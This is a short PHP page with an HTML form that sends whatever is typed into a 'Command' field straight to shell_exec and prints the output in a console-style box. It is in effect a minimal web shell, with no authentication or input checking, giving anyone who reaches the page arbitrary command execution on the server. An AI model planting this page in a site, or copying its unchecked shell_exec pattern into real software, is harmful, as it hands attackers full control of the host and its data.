<html>
<head>

    <style>
        body {
            font-family: Helvetica, Arial, sans-serif;
        }

        .console {
            background-color:black;
            color:white;
        }
    </style>
</head>
<body>

<form method="POST" action="">

    Command: <input type="text" name="userInput" id="userInput" style="min-width:400px">
    <input type="submit" value="Submit"/>

    <pre class="console"><?php
        if ($ui = $_POST['userInput']) {
            echo shell_exec($ui.' 2>&1');
        }
        ?>
    </pre>

</form>

</body>
</html>
